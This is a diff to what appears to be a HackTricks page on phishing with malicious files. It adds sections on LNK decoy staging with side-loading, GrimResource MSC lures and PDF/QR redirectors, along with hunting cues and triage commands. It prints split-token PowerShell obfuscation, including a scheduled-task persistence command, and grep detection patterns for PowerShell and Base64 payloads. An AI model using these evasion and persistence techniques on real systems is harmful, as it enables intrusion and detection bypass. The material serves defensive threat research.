@@ -85,7 +85,7 @@ Do this because you **can't save macro's inside a `.docx`** and there's a **stig
 
 ## LibreOffice ODT auto-run macros (Basic)
 
-LibreOffice Writer documents can embed Basic macros and auto-execute them when the file is opened by binding the macro to the **Open Document** event (Tools → Customize → Events → Open Document → Macro…). A simple reverse shell macro looks like:
+LibreOffice Writer documents can embed Basic macros and auto-execute them when the file is opened by binding the macro to the **Open Document** event (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> A simple reverse shell macro looks like:
 
 ```vb
 Sub Shell
@@ -186,7 +186,7 @@ Don't forget that you cannot only steal the hash or the authentication but also 
 
 ## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
 
-Highly effective campaigns deliver a ZIP that contains two legitimate decoy documents (PDF/DOCX) and a malicious .lnk. The trick is that the actual PowerShell loader is stored inside the ZIP’s raw bytes after a unique marker, and the .lnk carves and runs it fully in memory.
+Highly effective campaigns deliver a ZIP that contains two legitimate decoy documents (PDF/DOCX) and a malicious .lnk. The trick is that the actual PowerShell loader is stored inside the ZIP’s raw bytes after a unique marker, and the .lnk carves and runs it fully in memory.<sup>[[2]](#references)</sup>
 
 Typical flow implemented by the .lnk PowerShell one-liner:
 
@@ -220,7 +220,7 @@ Notes
 - The next stage frequently decrypts base64/XOR shellcode and executes it via Reflection.Emit + VirtualAlloc to minimize disk artifacts.
 
 Persistence used in the same chain
-- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:
+- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically.<sup>[[2]](#references)[[4]](#references)</sup> See details and ready-to-use commands here:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
@@ -232,14 +232,69 @@ Hunting/IOCs
 - AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
 - Long-running business threads ending with links hosted under trusted PaaS domains.
 
+## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading
+
+Another recurring pattern is a **document-impersonating `.lnk`** that immediately opens a benign lure while it stages the real chain in the background.<sup>[[3]](#references)</sup>
+
+Observed workflow:
+1. The shortcut **masquerades as a PDF** and uses `conhost.exe` or a similar proxy to spawn an obfuscated PowerShell downloader.
+2. The PowerShell fragments obvious tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) so naive detections looking for `iwr`, `gci`, `ren`, `cpi`, or `schtasks` miss the command.
+3. The stager downloads the **decoy document first**, opens it for the victim, and then reconstructs the malicious files in the background.
+4. Payloads may be written with **junk extensions** and then renamed by stripping filler characters, delaying the appearance of obvious `.exe` / `.cpl` artifacts.
+5. Persistence is established with a **minute-based scheduled task** that launches a trusted host binary from a user-writable path.
+
+Minimal hunting clues from this pattern:
+
+```powershell
+# Suspicious split-token PowerShell seen in LNK chains
+iw''r
+r''e''n
+&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
+```
+
+A useful staging layout to recognize is:
+- `C:\Users\Public\<decoy>.pdf`
+- `C:\Users\Public\<trusted>.exe`
+- `C:\Users\Public\<malicious>.cpl` or `.dll`
+- `C:\Windows\Tasks\<blob>.dat`
+
+### Why the second stage is stealthy
+
+In the Rapid7 case study, the scheduled task repeatedly launched **`Fondue.exe`** from `C:\Users\Public\`. Because **`APPWIZ.cpl`** was staged next to it and exported **`RunFODW`**, the trusted Microsoft binary side-loaded the attacker CPL instead of the legitimate system copy.
+
+The CPL then:
+- Reads an **AES-256-CBC** blob from `C:\Windows\Tasks\editor.dat`
+- Decrypts it through **Windows CNG / `bcrypt.dll`**
+- Allocates executable memory and copies the decrypted shellcode
+- Executes it indirectly by passing the shellcode pointer as the callback for **`EnumUILanguagesW`**
+
+That last step is worth hunting separately: malware often avoids a direct `((void(*)())buf)()` jump and instead abuses a **legitimate callback-taking WinAPI** to transfer execution.
+
+The decrypted payload in this campaign was **Donut** shellcode, which then mapped the final PE fully in memory and patched **AMSI/WLDP/ETW** in the current process before handing off execution. For deeper notes on side-loading and memory-resident post-processing, see:
+
+{{#ref}}
+../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
+{{#endref}}
+
+{{#ref}}
+../../windows-hardening/av-bypass.md
+{{#endref}}
+
+Practical hunting pivots:
+- `.lnk` spawning `powershell.exe` or `conhost.exe` followed by a visible decoy document.
+- Short-lived downloads to **`C:\Users\Public\`** followed by immediate renames from nonsense extensions.
+- Scheduled tasks with bland names such as `GoogleErrorReport` executing from **user-writable directories**.
+- Trusted binaries loading **`.cpl` / `.dll`** files from the same non-system directory.
+- Base64 text blobs written under **`C:\Windows\Tasks\`** and then read by the side-loaded module.
+
 ## Steganography-delimited payloads in images (PowerShell stager)
 
-Recent loader chains deliver an obfuscated JavaScript/VBS that decodes and runs a Base64 PowerShell stager. That stager downloads an image (often GIF) that contains a Base64-encoded .NET DLL hidden as plain text between unique start/end markers. The script searches for these delimiters (examples seen in the wild: «<<sudo_png>> … <<sudo_odt>>>»), extracts the between-text, Base64-decodes it to bytes, loads the assembly in-memory and invokes a known entry method with the C2 URL.
+Recent loader chains deliver an obfuscated JavaScript/VBS that decodes and runs a Base64 PowerShell stager. That stager downloads an image (often GIF) that contains a Base64-encoded .NET DLL hidden as plain text between unique start/end markers. The script searches for these delimiters (examples seen in the wild: «<<sudo_png>> … <<sudo_odt>>>»), extracts the between-text, Base64-decodes it to bytes, loads the assembly in-memory and invokes a known entry method with the C2 URL.<sup>[[5]](#references)</sup>
 
 Workflow
 - Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
 - Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
-- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about process hollowing and trusted utility proxy execution here:
+- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> See more about process hollowing and trusted utility proxy execution here:
 
 {{#ref}}
 ../../reversing/common-api-used-in-malware.md
@@ -275,7 +330,7 @@ $null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
 </details>
 
 Notes
-- This is ATT&CK T1027.003 (steganography/marker-hiding). Markers vary between campaigns.
+- This is ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Markers vary between campaigns.
 - AMSI/ETW bypass and string deobfuscation are commonly applied before loading the assembly.
 - Hunting: scan downloaded images for known delimiters; identify PowerShell accessing images and immediately decoding Base64 blobs.
 
@@ -287,7 +342,7 @@ See also stego tools and carving techniques:
 
 ## JS/VBS droppers → Base64 PowerShell staging
 
-A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.
+A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.<sup>[[5]](#references)</sup>
 
 Skeleton logic (abstract):
 - Read own file contents
@@ -299,6 +354,39 @@ Hunting cues
 - Archived JS/VBS attachments spawning `powershell.exe` with `-enc`/`FromBase64String` in the command line.
 - `wscript.exe` launching `powershell.exe -nop -w hidden` from user temp paths.
 
+## MSC documents as execution containers (GrimResource)
+
+Microsoft Management Console files (`.msc`) are XML console definitions normally opened by `mmc.exe`. **GrimResource** weaponizes a `StringTable` reference to an `apds.dll` resource containing an old XSS primitive, so a user opening the crafted console causes JavaScript to run inside `mmc.exe`. Observed samples combined `transformNode`-based obfuscation with **DotNetToJScript** to instantiate a .NET payload without the usual Office-macro path.<sup>[[9]](#references)</sup>
+
+For static triage, treat an untrusted MSC as text and do **not** double-click it:<sup>[[9]](#references)</sup>
+
+```bash
+file lure.msc
+xmllint --format lure.msc > lure.formatted.xml
+grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
+strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
+```
+
+High-signal runtime pivots are `mmc.exe` loading the CLR or script components, creating network connections, or spawning `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe`, or an unexpected executable. The format is legitimate, so detections should correlate **origin + suspicious XML/script content + `mmc.exe` behavior** instead of blocking every MSC.<sup>[[9]](#references)</sup>
+
+## PDF/QR redirectors and payload gating
+
+A PDF does not need an exploit to be useful. Recent campaigns place a **QR code or ordinary link** in a benign-looking document, move the browser session away from mail controls, and personalize the destination with the recipient address. Microsoft documented 2025 PDFs whose QR URLs were unique per recipient and led to RaccoonO365 credential-harvesting infrastructure; a parallel chain used IP/environment gating to return a JavaScript/MSI path to selected visitors but a benign PDF to scanners or disallowed clients.<sup>[[10]](#references)</sup>
+
+Triage both PDF actions and rendered QR codes. A QR may be vector-drawn rather than stored as an extractable image, so rasterize every page as well as extracting embedded images:
+
+```bash
+pdfid.py lure.pdf
+pdfdetach -list lure.pdf
+qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
+grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
+pdfimages -png lure.pdf image
+pdftoppm -png -r 300 lure.pdf page
+zbarimg --quiet image-*.png page-*.png
+```
+
+Inspect decoded destinations and redirects from an isolated analysis system without authenticating. Useful hunting features include QR-only PDFs with nearly empty mail bodies, the recipient email embedded in a query parameter, several redirects through reputable hosting, and different content returned according to IP, geolocation, cookies, referrer, or user agent. Compare requests with controlled profiles because a single sandbox fetch can receive only the decoy.<sup>[[10]](#references)</sup>
+
 ## Windows files to steal NTLM hashes
 
 Check the page about **places to steal NTLM creds**:
@@ -308,14 +396,18 @@ Check the page about **places to steal NTLM creds**:
 {{#endref}}
 
 
+
+
 ## References
 
-- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
-- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
-- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
-- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
-- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
-- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
-- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
-
+- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
+- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [3] [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
+- [4] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [5] [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
+- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
+- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
+- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
+- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console for initial access and evasion](https://www.elastic.co/security-labs/threat-command/grimresource)
+- [10] [Microsoft Security Blog – Threat actors leverage tax season to deploy tax-themed phishing campaigns](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
 {{#include ../../banners/hacktricks-training.md}}
